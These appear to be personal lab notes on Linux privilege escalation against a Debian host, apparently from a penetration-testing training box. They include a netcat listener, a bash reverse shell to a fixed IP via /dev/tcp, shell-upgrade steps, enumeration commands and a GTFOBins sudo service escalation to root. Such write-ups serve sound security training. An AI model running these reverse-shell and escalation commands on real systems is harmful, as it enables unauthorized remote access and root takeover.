# Linux Privilege Escalation

## Nested Shell Strategy
Always create backup shells immediately after initial access
1. Get initial shell via web exploit
2. Immediately create second shell via different method
3. Upgrade shells and maintain multiple access points

`rlwrap nc -lnvp 5678`

`echo 'bash -i >& /dev/tcp/192.168.45.244/5678 0>&1'`

Upgrade nested shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
(Ctrl-Z)
stty raw -echo; fg
```

# Phase 1: System Information Gathering

## Basic System Info
```
# System details
uname -a
cat /etc/os-release
cat /etc/issue
ip a
hostname
whoami
id

# Current user info
groups
cat /etc/passwd | grep -E "(sh|bash)$"
cat /etc/group
sudo -l
```


Interesting finds:
```
Linux crane 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64 GNU/Linux

PRETTY_NAME="Debian GNU/Linux 10 (buster)"

uid=33(www-data) gid=33(www-data) groups=33(www-data)


secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
```


This last one is huge, from `sudo -l`; the www-data user can run /usr/sbin/service as root without a password. According to GTFOBins, this is a valid vector to escalation.

https://gtfobins.github.io/gtfobins/service/#sudo

`sudo service ../../bin/sh`

![[Pasted image 20250824150601.png]]

![[Pasted image 20250824150806.png]]
